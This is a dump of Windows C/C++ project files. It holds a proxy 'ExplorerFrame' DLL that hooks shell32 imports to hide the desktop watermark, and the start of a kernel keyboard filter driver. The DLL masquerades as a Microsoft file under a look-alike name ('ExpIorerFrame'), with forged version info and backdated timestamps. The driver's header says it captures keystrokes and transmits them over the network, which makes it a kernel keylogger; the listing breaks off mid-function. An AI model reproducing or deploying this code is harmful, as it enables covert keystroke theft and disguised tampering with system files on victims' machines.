================================================================================
 FILE: Explorerframe\Explorerframe.cpp
 Creation date : 2025-10-10 11:28:32
 Modification date: 2025-10-08 22:37:28
 File size     : 8.5 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// ExplorerFrame Proxy DLL
// Watermark disabler for Windows Explorer

#include "Explorerframe.h"

// Redirect standard functions to minimal CRT
#define malloc min_malloc
#define calloc min_calloc
#define free min_free
#define realloc min_realloc
#define memcpy min_memcpy
#define memset min_memset
#define memcmp min_memcmp

// Export original ExplorerFrame functions
#pragma comment(linker, "/export:DllGetClassObject=explorerframe.DllGetClassObject,PRIVATE")
#pragma comment(linker, "/export:DllCanUnloadNow=explorerframe.DllCanUnloadNow,PRIVATE")

#define Length(a) (sizeof(a)/sizeof(a[0]))
static LPTSTR lpchNames[7];

// String search function
int indexOf(LPCTSTR source, int sourceOffset, int sourceCount,
    LPCTSTR target, int targetOffset, int targetCount, int fromIndex) {
    if (fromIndex >= sourceCount) return (targetCount == 0 ? sourceCount : -1);
    if (fromIndex < 0) fromIndex = 0;
    if (targetCount == 0) return fromIndex;

    TCHAR first = target[targetOffset];
    int max = sourceOffset + (sourceCount - targetCount);

    for (int i = sourceOffset + fromIndex; i <= max; i++) {
        if (source[i] != first) {
            while (++i <= max && source[i] != first);
        }
        if (i <= max) {
            int j = i + 1;
            int end = j + targetCount - 1;
            for (int k = targetOffset + 1; j < end && source[j] == target[k]; j++, k++);
            if (j == end) return i - sourceOffset;
        }
    }
    return -1;
}

// Watermark text detection
bool IsWatermarkText(LPCTSTR lptApiText) {
    const TCHAR lptWs = '%';
    if (!lptApiText || lptApiText[0] == 0) return false;

    int lenApiText = static_cast<int>(_tcslen(lptApiText));
    for (int i = 0; i < Length(lpchNames); i++) {
        if (lpchNames[i] && lpchNames[i][0] != 0) {
            int stPoint = 0;
            int lenWaterText = static_cast<int>(_tcslen(lpchNames[i]));
            if (i == 3 && lpchNames[i][0] == lptWs && lenWaterText > 4) {
                stPoint = 4;
                while ((++stPoint < lenWaterText) && (lpchNames[i][stPoint] != lptWs));
                lenWaterText = stPoint - 4;
                stPoint = 4;
            }
            if (indexOf(lptApiText, 0, lenApiText, lpchNames[i], stPoint, lenWaterText, 0) >= 0)
                return true;
        }
    }
    return false;
}

// LoadString proxy
INT WINAPI Proxy_LoadString(_In_opt_ HINSTANCE hInstance, _In_ UINT uID,
    _Out_ LPTSTR lpBuffer, _In_ int nBufferMax) {
    if (uID == 62000 || uID == 62001) return 0;
    return LoadString(hInstance, uID, lpBuffer, nBufferMax);
}

// ExtTextOut proxy
BOOL WINAPI Proxy_ExtTextOut(_In_ HDC hdc, _In_ int X, _In_ int Y, _In_ UINT fuOptions,
    _In_ const RECT* lprc, _In_ LPCTSTR lpString, _In_ UINT cbCount, _In_ const INT* lpDx) {
    if (IsWatermarkText(lpString)) return TRUE;
    return ExtTextOutW(hdc, X, Y, fuOptions, lprc, lpString, cbCount, lpDx);
}

// Import address patcher
BOOL WINAPI ImportPatch::ChangeImportedAddress(HMODULE hModule, LPCSTR modulename,
    FARPROC origfunc, FARPROC newfunc) {
    DWORD_PTR lpFileBase = (DWORD_PTR)hModule;
    if (!lpFileBase || !modulename || !origfunc || !newfunc) return FALSE;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBase;
    PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)(lpFileBase + dosHeader->e_lfanew);
    PIMAGE_IMPORT_DESCRIPTOR pImportDir = (PIMAGE_IMPORT_DESCRIPTOR)
        (lpFileBase + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (pImportDir->Name) {
        LPSTR name = (LPSTR)(lpFileBase + pImportDir->Name);
        if (lstrcmpiA(name, modulename) == 0) break;
        pImportDir++;
    }
    if (!pImportDir->Name) return FALSE;

    DWORD_PTR* pFunctions = (DWORD_PTR*)(lpFileBase + pImportDir->FirstThunk);
    while (*pFunctions) {
        if (*pFunctions == (DWORD_PTR)origfunc) break;
        pFunctions++;
    }
    if (!*pFunctions) return FALSE;

    DWORD oldpr;
    VirtualProtect(pFunctions, sizeof(DWORD_PTR), PAGE_EXECUTE_READWRITE, &oldpr);
    *pFunctions = (DWORD_PTR)newfunc;
    VirtualProtect(pFunctions, sizeof(DWORD_PTR), oldpr, &oldpr);
    return TRUE;
}

// Minimal CRT implementation
void* min_malloc(size_t size) { return HeapAlloc(GetProcessHeap(), 0, size); }
void* min_calloc(size_t count, size_t size) { return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, count * size); }
void min_free(void* ptr) { if (ptr) HeapFree(GetProcessHeap(), 0, ptr); }
void* min_realloc(void* ptr, size_t size) {
    return ptr ? HeapReAlloc(GetProcessHeap(), 0, ptr, size) : HeapAlloc(GetProcessHeap(), 0, size);
}
void* min_recalloc(void* ptr, size_t size) {
    return ptr ? HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ptr, size) : HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}
void* min_memcpy(void* dst, const void* src, size_t n) {
    char* q = (char*)dst; const char* p = (const char*)src;
    while (n--) *q++ = *p++; return dst;
}
void* min_memset(void* dst, int c, size_t n) {
    char* q = (char*)dst; while (n--) *q++ = c; return dst;
}
int min_memcmp(const void* s1, const void* s2, size_t n) {
    const unsigned char* c1 = (const unsigned char*)s1, * c2 = (const unsigned char*)s2;
    int d = 0; while (n--) { d = (int)*c1++ - (int)*c2++; if (d) break; } return d;
}

// C++ operators
void* operator new(size_t size) { return min_malloc(size); }
void operator delete(void* ptr) { min_free(ptr); }
void* operator new[](size_t size) { return min_malloc(size); }
void operator delete[](void* ptr) { min_free(ptr); }

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        HMODULE g_hShell32 = GetModuleHandle(_T("shell32.dll"));
        if (g_hShell32) {
            BOOL bImportChanged = FALSE;
            
            // Patch LoadString
            FARPROC pLoadString = GetProcAddress(GetModuleHandle(_T("api-ms-win-core-libraryloader-l1-2-0.dll")), "LoadStringW");
            if (!pLoadString) pLoadString = GetProcAddress(GetModuleHandle(_T("api-ms-win-core-libraryloader-l1-1-1.dll")), "LoadStringW");
            if (pLoadString) bImportChanged = ImportPatch::ChangeImportedAddress(g_hShell32, 
                pLoadString == GetProcAddress(GetModuleHandle(_T("api-ms-win-core-libraryloader-l1-1-1.dll")), "LoadStringW") ? 
                "api-ms-win-core-libraryloader-l1-1-1.dll" : "api-ms-win-core-libraryloader-l1-2-0.dll", pLoadString, (FARPROC)Proxy_LoadString);

            // Patch ExtTextOut
            FARPROC pExtTextOut = GetProcAddress(GetModuleHandle(_T("gdi32.dll")), "ExtTextOutW");
            if (pExtTextOut) bImportChanged = ImportPatch::ChangeImportedAddress(g_hShell32, "gdi32.dll", pExtTextOut, (FARPROC)Proxy_ExtTextOut);

            if (bImportChanged) {
                // Initialize watermark strings
                LPCTSTR lptBrand = _T("Windows ");
                LPCTSTR lptPr = _T("Build ");
                int iLpNamesSize[] = { 128, 64, 64, 128, 128, 167, 128 };

                for (BYTE i = 0; i < Length(lpchNames); i++)
                    lpchNames[i] = (LPTSTR)min_malloc(iLpNamesSize[i] * sizeof(TCHAR));

                // Get Windows branding
                HMODULE hBrand = LoadLibrary(_T("winbrand.dll"));
                if (hBrand) {
                    typedef BOOL(WINAPI* BrandLoadStr_t)(LPCTSTR, INT, LPTSTR, INT);
                    BrandLoadStr_t BrandLoadStr = (BrandLoadStr_t)GetProcAddress(hBrand, "BrandingLoadString");
                    if (BrandLoadStr && !BrandLoadStr(_T("Basebrd"), 12, lpchNames[0], iLpNamesSize[0]))
                        _tcscpy(lpchNames[0], lptBrand);
                    FreeLibrary(hBrand);
                }
                else _tcscpy(lpchNames[0], lptBrand);

                // Get watermark strings from shell32
                HMODULE hShell = GetModuleHandle(_T("shell32.dll"));
                if (hShell) {
                    UINT uiID[] = { 33088, 33089, 33108, 33109, 33111, 33117 };
                    for (int i = 0; i < Length(uiID); i++)
                        if (!LoadString(hShell, uiID[i], lpchNames[i + 1], iLpNamesSize[i + 1]))
                            _tcscpy(lpchNames[i + 1], lptPr);
                }
                else for (BYTE i = 1; i < Length(lpchNames); i++)
                    _tcscpy(lpchNames[i], lptPr);
            }
        }
        DisableThreadLibraryCalls(hModule);
    }
    return TRUE;
}


================================================================================
 FILE: Explorerframe\Explorerframe.h
 Creation date : 2025-10-10 11:28:32
 Modification date: 2025-10-08 22:17:39
 File size     : 1.16 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// ExplorerFrame Proxy Header

#include <Windows.h>
#include <delayimp.h>
#include <tchar.h>
#include <ShlObj.h>
#include <Shlwapi.h>

// Minimal CRT functions
void* min_malloc(size_t size);
void* min_calloc(size_t count, size_t size);
void min_free(void* ptr);
void* min_realloc(void* ptr, size_t size);
void* min_recalloc(void* ptr, size_t size);
void* min_memcpy(void* dst, const void* src, size_t n);
void* min_memset(void* dst, int c, size_t n);
int min_memcmp(const void* s1, const void* s2, size_t n);

// Import patcher
class ImportPatch {
public:
    static BOOL WINAPI ChangeImportedAddress(HMODULE hModule, LPCSTR modulename, FARPROC origfunc, FARPROC newfunc);
};

// Watermark detection
bool IsWatermarkText(LPCTSTR lptApiText);

// Proxy functions
INT WINAPI Proxy_LoadString(_In_opt_ HINSTANCE hInstance, _In_ UINT uID, _Out_ LPTSTR lpBuffer, _In_ int nBufferMax);
BOOL WINAPI Proxy_ExtTextOut(_In_ HDC hdc, _In_ int X, _In_ int Y, _In_ UINT fuOptions, _In_ const RECT* lprc, _In_ LPCTSTR lpString, _In_ UINT cbCount, _In_ const INT* lpDx);

// DllMain
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);


================================================================================
 FILE: Explorerframe\Explorerframe.vcxproj
 Creation date : 2025-10-10 11:28:32
 Modification date: 2025-10-08 22:39:28
 File size     : 3.62 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{1397E214-C8EB-4411-9A10-4A382E676685}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>ExplorerFrame</RootNamespace>
    <TargetName>ExpIorerFrame</TargetName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <PlatformToolset>v143</PlatformToolset>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)x64\Release\</OutDir>
    <TargetName>ExpIorerFrame</TargetName>
    <TargetExt>.dll</TargetExt>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
	  <PreprocessorDefinitions>WIN64;NDEBUG;_WINDOWS;_USRDLL;BUILDING_DLL;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ExceptionHandling>false</ExceptionHandling>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <IgnoreAllDefaultLibraries>true</IgnoreAllDefaultLibraries>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
      <AdditionalDependencies>shlwapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <OutputFile>$(OutDir)$(TargetName)$(TargetExt)</OutputFile>
      <UACUIAccess>false</UACUIAccess>
      <GenerateMapFile>false</GenerateMapFile>
    </Link>
    <PostBuildEvent>
      <Command>powershell -Command "&amp; {$f='$(OutDir)$(TargetName)$(TargetExt)'; (Get-Item $f).CreationTime='2026-01-01 00:00:00'; (Get-Item $f).LastWriteTime='2026-01-01 00:00:00'}"</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="Explorerframe.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Explorerframe.h" />
    <ClInclude Include="resource.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="version.rc" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>


================================================================================
 FILE: Explorerframe\Explorerframe.vcxproj.filters
 Creation date : 2025-10-10 11:28:32
 Modification date: 2025-10-08 22:14:57
 File size     : 1.24 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Explorerframe.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Explorerframe.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="version.rc">
      <Filter>Resource Files</Filter>
    </ItemGroup>
</Project>


================================================================================
 FILE: Explorerframe\resource.h
 Creation date : 2025-10-10 11:28:32
 Modification date: 2025-10-08 22:20:52
 File size     : 0.34 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by version.rc

#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif


================================================================================
 FILE: Explorerframe\version.rc
 Creation date : 2025-10-10 11:28:32
 Modification date: 2025-10-08 21:49:03
 File size     : 4.15 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US

/////////////////////////////////////////////////////////////////////////////
//
// Version Information - Microsoft Corporation branding
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 10,0,26200,8460
 PRODUCTVERSION 10,0,26200,8460
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x2L          // DLL file type
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "Microsoft Corporation"
            VALUE "FileDescription", "Windows Shell Explorer Frame"
            VALUE "FileVersion", "10.0.26200.8460"
            VALUE "InternalName", "ExplorerFrame.dll"
            VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "ExplorerFrame.dll"
            VALUE "ProductName", "Microsoft® Windows® Operating System"
            VALUE "ProductVersion", "10.0.26200.8460"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////

#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//

/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


================================================================================
 FILE: kvckbd\driver.c
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-07 19:34:02
 File size     : 34 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

/*++

Module Name:
    driver_main.c

Abstract:
    Main driver implementation for keyboard input filtering and logging.
    This driver intercepts keyboard class driver (kbdclass.sys) read
    requests and processes keyboard input data before forwarding it
    to the original recipient.

    The driver works by:
    1. Hooking into the keyboard class driver's device objects
    2. Intercepting IRP_MJ_READ requests
    3. Processing keyboard scan codes
    4. Transmitting data over the network
    5. Forwarding IRPs to the original handler

Environment:
    Kernel mode only.

--*/

#include "driver.h"
#include "network.h"
#include "scancode.h"


//
// Global Driver Device Object
//
PDEVICE_OBJECT g_FilterDeviceObject = NULL;

//
// Architecture-Specific Constants
//
#ifdef _WIN64
    #define REMOVE_LOCK_OFFSET_DE      KBDCLASS_REMOVELOCK_OFFSET
    #define SPIN_LOCK_OFFSET_DE        KBDCLASS_SPINLOCK_OFFSET
    #define READ_QUEUE_OFFSET_DE       KBDCLASS_READQUEUE_OFFSET
#else
    #define REMOVE_LOCK_OFFSET_DE      KBDCLASS_REMOVELOCK_OFFSET
    #define SPIN_LOCK_OFFSET_DE        KBDCLASS_SPINLOCK_OFFSET
    #define READ_QUEUE_OFFSET_DE       KBDCLASS_READQUEUE_OFFSET
#endif

//
// Driver Configuration
//
#define KBDDRIVER_THREAD_DELAY_INTERVAL    1000000  // 100ms in 100-nanosecond units
#define KBDDRIVER_MAX_DEVICE_EXTENSION     sizeof(KBDDRIVER_DEVICE_EXTENSION)

/*++

Routine: KbdIrp_DeviceControl

Description:
    Handles IRP_MJ_DEVICE_CONTROL requests by forwarding them to the
    appropriate keyboard device object.

Arguments:
    DeviceObject    - Pointer to our filter device object
    Irp             - Pointer to the I/O request packet

Return Value:
    NTSTATUS from IoCallDriver

--*/
NTSTATUS
KbdIrp_DeviceControl(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
)
{
    NTSTATUS                        Status;
    PIO_STACK_LOCATION              IrpStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    
    UNREFERENCED_PARAMETER(DeviceObject);
    
    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    //
    // Find the keyboard object matching this file object
    //
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
        {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL)
    {
        KBD_ERROR("DeviceControl: Keyboard object not found for FileObject %p",
            IrpStack->FileObject);
        Status = STATUS_INVALID_PARAMETER;
        goto Exit;
    }
    
    //
    // Forward the request to the real keyboard device
    //
    IoSkipCurrentIrpStackLocation(Irp);
    
    Status = IoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
    
    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("IoCallDriver failed in DeviceControl: 0x%08X", Status);
    }
    
Exit:
    
    return Status;
}

/*++

Routine: KbdIrp_Cancel

Description:
    Cancellation routine for pending read IRPs. This function is called
    when an IRP is cancelled (e.g., application closes or times out).

Arguments:
    DeviceObject    - Pointer to our filter device object
    Irp             - Pointer to the I/O request packet being cancelled

Return Value:
    None.

--*/
VOID
KbdIrp_Cancel(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    PIO_STACK_LOCATION              IrpStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    
    UNREFERENCED_PARAMETER(DeviceObject);
    
    //
    // Release the cancel spin lock
    //
    IoReleaseCancelSpinLock(Irp->CancelIrql);
    
    IrpStack = IoGetCurrentIrpStackLocation(Irp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    //
    // Find the keyboard object matching this file object
    //
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        
        if (KeyboardObject->KbdFileObject == IrpStack->FileObject)
        {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL)
    {
        KBD_ERROR("Cancel: Keyboard object not found for FileObject %p",
            IrpStack->FileObject);
        goto Exit;
    }
    
    //
    // Mark the IRP as cancelled and restore original device object
    //
    ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
    
    KeyboardObject->IrpCancel = TRUE;
    KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
    
    ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
    
    //
    // Cancel the forwarded IRP if it exists
    //
    if (KeyboardObject->NewIrp != NULL)
    {
        IoCancelIrp(KeyboardObject->NewIrp);
    }
    
Exit:
    
    //
    // Complete the cancelled IRP
    //
    Irp->IoStatus.Status = STATUS_CANCELLED;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
}

/*++

Routine: KbdThread_HandleRead

Description:
    System thread that handles keyboard read operations. This thread:
    1. Creates a new IRP to forward to the real keyboard device
    2. Waits for the IRP to complete
    3. Processes keyboard input data
    4. Completes the original IRP

Arguments:
    StartContext - Pointer to the original IRP

Return Value:
    None. Thread terminates via PsTerminateSystemThread.

--*/
VOID
KbdThread_HandleRead(
    _In_ PVOID StartContext
)
{
    NTSTATUS                        Status;
    PIRP                            OriginalIrp;
    PIRP                            ForwardedIrp;
    PIO_STACK_LOCATION              OriginalStack;
    PIO_STACK_LOCATION              ForwardedStack;
    PLIST_ENTRY                     ListEntry;
    PKBDDRIVER_KEYBOARD_OBJECT      KeyboardObject;
    PKBDDRIVER_DEVICE_EXTENSION     DeviceExtension;
    PIO_REMOVE_LOCK                 RemoveLock;
    PKEYBOARD_INPUT_DATA            InputData;
    
    if (StartContext == NULL)
    {
        KBD_ERROR("HandleRead: NULL StartContext");
        PsTerminateSystemThread(STATUS_INVALID_PARAMETER);
        return;
    }
    
    OriginalIrp = (PIRP)StartContext;
    OriginalStack = IoGetCurrentIrpStackLocation(OriginalIrp);
    DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
    KeyboardObject = NULL;
    
    //
    // Find the keyboard object for this file object
    //
    ListEntry = DeviceExtension->KbdObjListHead.Flink;
    
    while (ListEntry != &DeviceExtension->KbdObjListHead)
    {
        KeyboardObject = CONTAINING_RECORD(
            ListEntry,
            KBDDRIVER_KEYBOARD_OBJECT,
            ListEntry
        );
        
        if (KeyboardObject->KbdFileObject == OriginalStack->FileObject)
        {
            break;
        }
        
        ListEntry = ListEntry->Flink;
    }
    
    if (KeyboardObject == NULL)
    {
        KBD_ERROR("HandleRead: Keyboard object not found");
        Status = STATUS_INVALID_PARAMETER;
        goto Exit;
    }
    
    //
    // Release the remove lock if we acquired it
    //
    RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension 
        + REMOVE_LOCK_OFFSET_DE);
    
    if (OriginalIrp == KeyboardObject->RemoveLockIrp)
    {
        IoReleaseRemoveLock(RemoveLock, OriginalIrp);
        KeyboardObject->RemoveLockIrp = NULL;
    }
    
    //
    // Build a new IRP to forward to the keyboard device
    //
    ForwardedIrp = IoBuildSynchronousFsdRequest(
        IRP_MJ_READ,
        KeyboardObject->KbdDeviceObject,
        OriginalIrp->AssociatedIrp.SystemBuffer,
        OriginalStack->Parameters.Read.Length,
        &OriginalStack->Parameters.Read.ByteOffset,
        &KeyboardObject->Event,
        &OriginalIrp->IoStatus
    );
    
    if (ForwardedIrp == NULL)
    {
        KBD_ERROR("IoBuildSynchronousFsdRequest failed");
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }
    
    //
    // Initialize the forwarded IRP
    //
    KeClearEvent(ForwardedIrp->UserEvent);
    ForwardedIrp->Tail.Overlay.Thread = PsGetCurrentThread();
    ForwardedIrp->Tail.Overlay.AuxiliaryBuffer = NULL;
    ForwardedIrp->RequestorMode = KernelMode;
    ForwardedIrp->PendingReturned = FALSE;
    ForwardedIrp->Cancel = FALSE;
    ForwardedIrp->CancelRoutine = NULL;
    ForwardedIrp->Tail.Overlay.OriginalFileObject = NULL;
    ForwardedIrp->Overlay.AsynchronousParameters.UserApcRoutine = NULL;
    ForwardedIrp->Overlay.AsynchronousParameters.UserApcContext = NULL;
    
    //
    // Set up the stack location for the forwarded IRP
    //
    ForwardedStack = IoGetNextIrpStackLocation(ForwardedIrp);
    ForwardedStack->FileObject = KeyboardObject->KbdFileObject;
    ForwardedStack->Parameters.Read.Key = OriginalStack->Parameters.Read.Key;
    
    //
    // Store the forwarded IRP reference
    //
    ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
    KeyboardObject->NewIrp = ForwardedIrp;
    ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
    
    //
    // Send the IRP to the keyboard device
    //
    Status = IoCallDriver(KeyboardObject->KbdDeviceObject, ForwardedIrp);
    
    if (!NT_SUCCESS(Status))
    {
        KBD_ERROR("IoCallDriver failed in HandleRead: 0x%08X", Status);
    }
    
    //
    // Wait for the IRP to complete if it's pending
    //
    if (Status == STATUS_PENDING)
    {
        KeWaitForSingleObject(
            ForwardedIrp->UserEvent,
            Executive,
            KernelMode,
            FALSE,
            NULL
        );
        
        Status = OriginalIrp->IoStatus.Status;
    }
    
    //
    // Check if the operation was cancelled
    //
    if (KeyboardObject->IrpCancel)
    {
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
        KeyboardObject->SafeUnload = TRUE;
        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
        goto Exit;
    }
    else
    {
        IoSetCancelRoutine(OriginalIrp, NULL);
    }
    
    //
    // Process keyboard input data
    //
    if (NT_SUCCESS(OriginalIrp->IoStatus.Status) && 
        OriginalIrp->IoStatus.Information > 0)
    {
        OriginalStack->Parameters.Read.Length = (ULONG)OriginalIrp->IoStatus.Information;
        InputData = (PKEYBOARD_INPUT_DATA)OriginalIrp->AssociatedIrp.SystemBuffer;
        
        //
        // Iterate through all keyboard input data structures
        //
        while ((PCHAR)InputData < (PCHAR)OriginalIrp->AssociatedIrp.SystemBuffer + 
            OriginalIrp->IoStatus.Information)
        {
            //
            // Process each scan code (now uses line buffering)
            //
            KbdHandler_ProcessScanCode(InputData);
            KbdHandler_ConfigureMapping(InputData);
            
            InputData++;
        }
        
        //
        // Mark as safe to unload
        //
        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
